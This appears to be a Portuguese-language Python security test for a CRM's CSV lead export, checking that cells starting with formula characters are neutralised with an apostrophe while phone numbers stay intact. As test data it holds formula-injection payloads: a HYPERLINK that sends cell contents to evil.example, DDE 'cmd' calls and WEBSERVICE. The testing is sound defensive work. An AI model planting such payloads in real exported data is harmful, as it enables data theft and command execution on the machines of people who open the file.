# -*- coding: utf-8 -*-
"""
SEC-CSV-01 - injecao de formula na exportacao CSV da Segmentacao.

O SINK

`exportLeads()` (templates/segmentacao.html) baixa os leads de uma lista como
CSV e coloca TODA celula entre aspas:

    "${String(c).replace(/"/g,'""')}"

Aspas NAO impedem a planilha de avaliar formula: Excel, LibreOffice e Sheets
leem o CSV, desfazem o quoting e SO ENTAO decidem se a celula e formula - e e,
quando o texto comeca com `=`, `+`, `-`, `@`, TAB ou CR. `=HYPERLINK(...)` e
`=WEBSERVICE(...)` exfiltram o conteudo da planilha; `=cmd|' /C calc'!A0` e DDE
no Excel antigo.

A ORIGEM DO DADO

nome, email e nome de tag vem de terceiro NAO autenticado: o formulario publico
do site e a extracao por LLM da conversa de WhatsApp, os dois gravados via n8n.
Quem abre o arquivo e um operador do CRM, na propria maquina.

A REGRA (decidida pelo dono do produto)

Prefixar `'` na celula cujo texto comeca com um desses seis caracteres, EXCETO a
celula que e so formato de telefone/numero: um `+` ou `-` inicial seguido apenas
de digitos, espacos, `-`, `(`, `)` e `.`. Sem letra nao ha como chamar funcao, e o WhatsApp do lead e
guardado muitas vezes como `+55 11 98765-4322` - prefixar estragaria a coluna
mais usada do arquivo.

A TECNICA (a da secao 1 de tests/test_xss_crud_templates.py)

EXECUCAO REAL sob node: a `exportLeads` do proprio template e RODADA, com `Auth`,
`Blob`, `URL`, `document` e `alert` stubados. O stub de `Blob` guarda o texto que
iria para o arquivo; o Python o le com o modulo `csv`, como a planilha leria, e
afirma sobre as CELULAS - nao sobre a grafia do codigo. Cada payload vai num lead
proprio, com o resto benigno, para que um teste vermelho aponte UM campo so.

O `node` nao e dependencia nova (o runner do CI ja o traz para o
actions/checkout). Por isso este arquivo EXIGE node em vez de pular em silencio.

Rodar:  python tests/test_segmentacao_csv_formula.py
"""
import csv
import io
import json
import pathlib
import re
import shutil
import subprocess
import sys

RAIZ = pathlib.Path(__file__).resolve().parent.parent
SEG_SRC = (RAIZ / "templates" / "segmentacao.html").read_text(encoding="utf-8")

BOM = chr(0xFEFF)  # chr() mantem o fonte ASCII: o literal U+FEFF e invisivel no editor
CABECALHO = ["ID", "Nome", "Email", "WhatsApp", "Destinos", "Tags", "Chegada", "Partida"]
ID_LISTA = 7  # currentDetailSegId do stub

# Os seis caracteres que abrem formula, um payload realista para cada um.
NOME_IGUAL = '=HYPERLINK("http://evil.example/?q="&A1,"clique")'
EMAIL_ARROBA = "@SUM(1+1)*cmd|' /C calc'!A0"
TAG_MAIS = "+cmd|' /C calc'!A0"
DESTINO_MENOS = "-2+3+cmd|' /C calc'!A0"
NOME_TAB = "\t=1+1"
NOME_CR = "\r=1+1"

# Formato de telefone/numero: tem que sair IGUAL. Quatro abrem com `+` (e e neles
# que a excecao trabalha - os dois ultimos pinam `(`, `)` e `.` na classe); os
# outros dois nao abrem formula de qualquer jeito.
TELEFONES = ["+55 11 98765-4322", "5511999999999", "+56912345678", "(11) 9999-9999",
             "+55 (11) 98765-4322", "+55.11.98765.4322"]

# A fronteira da excecao: abre com `+` como um telefone e so tem sinal, parenteses
# e alfanumericos - mas tem LETRA, entao nao e formato de telefone. E o payload
# que uma excecao frouxa (letras aceitas) deixaria passar; os de cima tem `|`, `'`,
# `!` ou `/` e seriam barrados mesmo assim. Cabe nos 30 caracteres do whatsapp.
WHATSAPP_FORMULA = "+WEBSERVICE(A1)"

# A outra fronteira: formulas SEM letra. Cada uma tem um caractere que a classe da
# excecao nao pode aceitar (`=`, `@`, `|`/`!`, `+` fora do inicio); sem estes
# casos, alargar a classe com qualquer um deles passava calado.
FORMULAS_SEM_LETRA = ["=1-1", "@1", "-1|2!3", "-2+3"]

BASE = {
    "nome": "Fulano", "email": "fulano@example.com", "whatsapp": "5511999999999",
    "destinos": ["Atacama"], "tags": [{"nome": "VIP"}],
    "data_chegada": "2026-11-03", "data_partida": "2026-11-10",
}

# cenario -> so o que foge do BASE. Um payload por lead.
_CAMPOS = {
    "comum": {},
    "vazio": {
        "email": None, "whatsapp": None, "destinos": [], "tags": [],
        "data_chegada": None, "data_partida": None,
    },
    "aspas": {"nome": 'Ana "Tita"'},
    "nome_igual": {"nome": NOME_IGUAL},
    "email_arroba": {"email": EMAIL_ARROBA},
    "tag_mais": {"tags": [{"nome": TAG_MAIS}]},
    "destino_menos": {"destinos": [DESTINO_MENOS]},
    "nome_tab": {"nome": NOME_TAB},
    "nome_cr": {"nome": NOME_CR},
    "whatsapp_formula": {"whatsapp": WHATSAPP_FORMULA},
    **{"sem_letra_%d" % i: {"whatsapp": f} for i, f in enumerate(FORMULAS_SEM_LETRA)},
    **{"telefone_%d" % i: {"whatsapp": tel} for i, tel in enumerate(TELEFONES)},
}
LEADS = {
    cenario: {**BASE, "id": i, **campos}
    for i, (cenario, campos) in enumerate(_CAMPOS.items(), start=1)
}


# ---------------------------------------------------------------------------
# Extracao: o codigo REAL do template
# ---------------------------------------------------------------------------

# O SEC-CSV-01 tirou o escape da celula de DENTRO de exportLeads para um helper
# vizinho; antes dele o escape morava inline e o helper nao existia. O harness
# roda o que o template TEM, entao o MESMO teste mede o codigo vulneravel
# (vermelho) e o corrigido (verde). Se exportLeads chamar um nome que ninguem
# extraiu, o node estoura com ReferenceError - nao passa calado.
AJUDANTE = "celulaCsv"


def _assinatura(nome):
    return re.compile(r"^(?:async )?function " + re.escape(nome) + r"\(", re.M)


def _funcao(src, nome):
    """Codigo REAL de uma funcao de topo do template, `async` incluido.

    O `_corpo` de test_xss_crud_templates.py procura "function nome(" e por isso
    deixaria o `async` para tras: o `await` do corpo viraria erro de sintaxe. Aqui
    a assinatura e ancorada na coluna 0 (nao casa funcao aninhada de mesmo nome) e
    o fim e o primeiro `}` em coluna 0 depois dela. O corte e CONFERIDO - chaves
    balanceadas - para que um fecho errado nao passe por "a funcao".
    """
    m = _assinatura(nome).search(src)
    assert m, f"funcao de topo {nome} nao existe mais no template"
    fim = src.find("\n}", m.end())
    assert fim != -1, f"nao achei o fecho em coluna 0 da funcao {nome}"
    codigo = src[m.start():fim + 2]
    assert codigo.count("{") == codigo.count("}"), (
        f"corte da funcao {nome} com chaves desbalanceadas: o primeiro fecho em "
        "coluna 0 nao e o dela - ajuste a extracao"
    )
    return codigo


def _codigo_do_export():
    """exportLeads e, quando existir, o helper de celula que ela chama."""
    export = _funcao(SEG_SRC, "exportLeads")
    assert export.startswith("async function exportLeads("), (
        f"a extracao perdeu o async de exportLeads: {export[:40]!a}"
    )
    ajudante = [_funcao(SEG_SRC, AJUDANTE)] if _assinatura(AJUDANTE).search(SEG_SRC) else []
    return "\n".join(ajudante + [export])


# ---------------------------------------------------------------------------
# Execucao: node com o palco minimo que exportLeads precisa
# ---------------------------------------------------------------------------

_PALCO = """
'use strict';
const LEADS = __LEADS__;
let pedido = null, cliques = 0, revogados = 0;
const blobs = [], baixados = [], alertas = [];

let currentDetailSegId = __ID__;
const Auth = {
    apiRequest: async (url) => {
        pedido = url;
        return { ok: true, json: async () => ({ leads: LEADS }) };
    },
};
// O Blob real guarda bytes; este guarda o TEXTO das partes, que e o que o codigo
// montou (BOM + CSV).
class Blob {
    constructor(partes, opcoes) {
        blobs.push({ texto: partes.join(''), tipo: opcoes && opcoes.type });
    }
}
const URL = { createObjectURL: () => 'blob:stub', revokeObjectURL: () => { revogados++; } };
const document = {
    createElement: () => ({
        href: '', download: '',
        click() { cliques++; baixados.push(this.download); },
    }),
};
function alert(msg) { alertas.push(msg); }
"""

_EXECUTA = """
exportLeads().then(() => {
    if (blobs.length !== 1) {
        throw new Error('esperado 1 Blob, vieram ' + blobs.length + '; alertas: ' + JSON.stringify(alertas));
    }
    console.log(JSON.stringify({
        csv: blobs[0].texto, tipo: blobs[0].tipo,
        pedido, cliques, revogados, baixados, alertas,
    }));
}).catch(e => { console.error(String((e && e.stack) || e)); process.exit(1); });
"""

_cache = {}


def _ascii(txt):
    """O stderr do node pode ecoar a linha do fonte com o BOM; console cp1252 nao o imprime."""
    return txt.encode("ascii", "backslashreplace").decode("ascii")


def _roda():
    """Executa a exportLeads do template UMA vez e devolve o que ela produziu."""
    if "r" in _cache:
        return _cache["r"]
    node = shutil.which("node")
    assert node, (
        "node e necessario para executar a exportLeads de verdade. Este teste "
        "NAO pula em silencio: sem execucao real ele nao prova nada sobre o CSV "
        "produzido, e a injecao de formula vive justamente no texto gerado."
    )
    script = (
        _PALCO.replace("__LEADS__", json.dumps(list(LEADS.values()))).replace("__ID__", str(ID_LISTA))
        + _codigo_do_export() + "\n"
        + _EXECUTA
    )
    p = subprocess.run(
        [node, "-e", script],
        capture_output=True, text=True, encoding="utf-8", errors="replace",
    )
    assert p.returncode == 0, f"node falhou: {_ascii(p.stderr.strip())}"
    _cache["r"] = json.loads(p.stdout)
    return _cache["r"]


def _linhas():
    """O CSV como a planilha o le: sem o BOM e com o quoting desfeito."""
    texto = _roda()["csv"]
    if texto.startswith(BOM):
        texto = texto[1:]
    return list(csv.reader(io.StringIO(texto, newline="")))


def _linha(cenario):
    """{coluna: celula} da linha do lead do cenario, achada pelo ID (1a coluna)."""
    cabecalho, *linhas = _linhas()
    alvo = str(LEADS[cenario]["id"])
    achadas = [dict(zip(cabecalho, linha)) for linha in linhas if linha and linha[0] == alvo]
    assert len(achadas) == 1, (
        f"esperada 1 linha para o lead {alvo} ({cenario}), vieram {len(achadas)}"
    )
    return achadas[0]


def _exige_neutralizada(cenario, coluna, original):
    """A celula sai com UM `'` na frente e o resto IDENTICO ao que foi gravado."""
    celula = _linha(cenario)[coluna]
    assert celula.startswith("'"), (
        f"{coluna}: formula NAO neutralizada - a celula comeca com {celula[:1]!a}, "
        f"sem o prefixo de apostrofo: {celula!a}"
    )
    assert celula[1:] == original, (
        f"{coluna}: o prefixo alterou o conteudo - {celula[1:]!a} != {original!a}"
    )


# ---------------------------------------------------------------------------
# 1. NEUTRALIZADAS: cada um dos seis caracteres de abertura de formula
# ---------------------------------------------------------------------------

def test_sec_csv_01_nome_iniciado_por_igual_vira_texto():
    """`=` e o caso classico: o HYPERLINK de exfiltracao sai com o apostrofo na frente."""
    _exige_neutralizada("nome_igual", "Nome", NOME_IGUAL)


def test_sec_csv_01_email_iniciado_por_arroba_vira_texto():
    """`@` abre formula no Excel/Lotus: o email nao pode chegar cru."""
    _exige_neutralizada("email_arroba", "Email", EMAIL_ARROBA)


def test_sec_csv_01_tag_iniciada_por_mais_vira_texto():
    """`+` no nome da tag: a celula Tags e a junta dos nomes, e esta comeca com `+`."""
    _exige_neutralizada("tag_mais", "Tags", TAG_MAIS)


def test_sec_csv_01_destino_iniciado_por_menos_vira_texto():
    """`-2+3+cmd...` comeca com digito depois do sinal: e a excecao do telefone que ele tenta abusar."""
    _exige_neutralizada("destino_menos", "Destinos", DESTINO_MENOS)


def test_sec_csv_01_nome_iniciado_por_tab_vira_texto():
    """TAB na frente: planilhas ignoram o branco inicial e avaliam o `=` que vem depois."""
    _exige_neutralizada("nome_tab", "Nome", NOME_TAB)


def test_sec_csv_01_nome_iniciado_por_cr_vira_texto():
    """CR na frente (dentro das aspas do CSV): mesmo truque do TAB."""
    _exige_neutralizada("nome_cr", "Nome", NOME_CR)


def test_sec_csv_01_whatsapp_com_letras_nao_ganha_a_excecao_de_telefone():
    """Letra derruba a excecao: `+WEBSERVICE(A1)` so tem sinal, parenteses e alfanumericos."""
    _exige_neutralizada("whatsapp_formula", "WhatsApp", WHATSAPP_FORMULA)


def test_sec_csv_01_formula_sem_letra_nao_ganha_a_excecao_de_telefone():
    """Sem letra, mas com `=`, `@`, `|`, `!` ou `+` no meio: nao e telefone, ganha o `'`."""
    for i, formula in enumerate(FORMULAS_SEM_LETRA):
        _exige_neutralizada("sem_letra_%d" % i, "WhatsApp", formula)


# ---------------------------------------------------------------------------
# 2. INTACTAS: corrigir sem quebrar
# ---------------------------------------------------------------------------

def test_sec_csv_01_whatsapp_em_formato_de_telefone_sai_intacto():
    """A excecao: sem letra nao ha funcao para chamar, e o prefixo estragaria a coluna."""
    alterados = {}
    for i, telefone in enumerate(TELEFONES):
        celula = _linha("telefone_%d" % i)["WhatsApp"]
        if celula != telefone:
            alterados[telefone] = celula
    assert not alterados, (
        "telefone alterado pelo escape (a saida tem que ser identica a entrada): "
        f"{alterados!a}"
    )


def test_sec_csv_01_valores_comuns_saem_intactos():
    """Nome, email com `@` no MEIO, destino, tag, id numerico e datas ISO: so o INICIO da celula conta."""
    esperado = {
        "ID": str(LEADS["comum"]["id"]), "Nome": "Fulano", "Email": "fulano@example.com",
        "WhatsApp": "5511999999999", "Destinos": "Atacama", "Tags": "VIP",
        "Chegada": "2026-11-03", "Partida": "2026-11-10",
    }
    obtido = _linha("comum")
    assert obtido == esperado, f"linha de valores comuns alterada: {obtido!a} != {esperado!a}"


def test_sec_csv_01_aspas_no_valor_continuam_ida_e_volta_exata():
    """O quoting do CSV nao pode ser tocado: aspa dobrada na escrita volta aspa simples na leitura."""
    celula = _linha("aspas")["Nome"]
    assert celula == 'Ana "Tita"', f"Nome com aspas nao fez a ida e volta: {celula!a}"


def test_sec_csv_01_campos_ausentes_continuam_vazios():
    """null e lista vazia viram celula vazia - nem `undefined`, nem apostrofo solto."""
    obtido = _linha("vazio")
    opcionais = CABECALHO[2:]
    assert {c: obtido[c] for c in opcionais} == {c: "" for c in opcionais}, (
        f"campo ausente deixou de sair vazio: {obtido!a}"
    )


# ---------------------------------------------------------------------------
# 3. ESTRUTURA: o que o ajuste nao pode mexer
# ---------------------------------------------------------------------------

def test_sec_csv_01_o_arquivo_continua_comecando_com_bom_utf8():
    """Sem o BOM o Excel abre o UTF-8 como ANSI e quebra os acentos."""
    texto = _roda()["csv"]
    assert texto.startswith(BOM), f"o texto do Blob perdeu o BOM: {texto[:12]!a}"


def test_sec_csv_01_o_cabecalho_nao_mudou():
    cabecalho = _linhas()[0]
    assert cabecalho == CABECALHO, f"cabecalho alterado: {cabecalho!a} != {CABECALHO!a}"


def test_sec_csv_01_uma_linha_por_lead_e_todas_com_as_oito_colunas():
    """Celula hostil (virgula, aspas, TAB, CR) nao pode partir nem fundir linhas."""
    linhas = _linhas()
    ids = [linha[0] for linha in linhas[1:]]
    esperado = [str(lead["id"]) for lead in LEADS.values()]
    assert ids == esperado, f"linhas por lead diferentes do esperado: {ids!a} != {esperado!a}"
    largura = [len(linha) for linha in linhas]
    assert set(largura) == {len(CABECALHO)}, (
        f"linha com numero de colunas diferente de {len(CABECALHO)}: {largura!a}"
    )


def test_sec_csv_01_o_download_continua_igual():
    """Pedido com limit=500, nome do arquivo, tipo do Blob e um unico clique."""
    r = _roda()
    assert r["pedido"] == "/api/segments/%d/leads?limit=500" % ID_LISTA, (
        f"o pedido mudou: {r['pedido']!a}"
    )
    assert r["tipo"] == "text/csv;charset=utf-8;", f"o tipo do Blob mudou: {r['tipo']!a}"
    padrao = re.escape("segmento_%d_" % ID_LISTA) + r"\d{4}-\d{2}-\d{2}\.csv"
    assert len(r["baixados"]) == 1 and re.fullmatch(padrao, r["baixados"][0]), (
        f"nome do arquivo baixado fora do padrao segmento_<id>_<data>.csv: {r['baixados']!a}"
    )
    assert (r["cliques"], r["revogados"], r["alertas"]) == (1, 1, []), (
        f"esperado 1 clique, 1 revogacao e nenhum alerta: {(r['cliques'], r['revogados'], r['alertas'])!a}"
    )


ALL_TESTS = [v for k, v in sorted(globals().items())
             if k.startswith("test_") and callable(v)]

if __name__ == "__main__":
    falhas = 0
    for fn in ALL_TESTS:
        try:
            fn()
            print(f"PASS  {fn.__name__}")
        except AssertionError as exc:
            falhas += 1
            print(f"FAIL  {fn.__name__}: {exc}")
        except Exception as exc:
            falhas += 1
            print(f"ERROR {fn.__name__}: {type(exc).__name__}: {exc}")
    print(f"\n{len(ALL_TESTS) - falhas}/{len(ALL_TESTS)} testes OK")
    sys.exit(1 if falhas else 0)
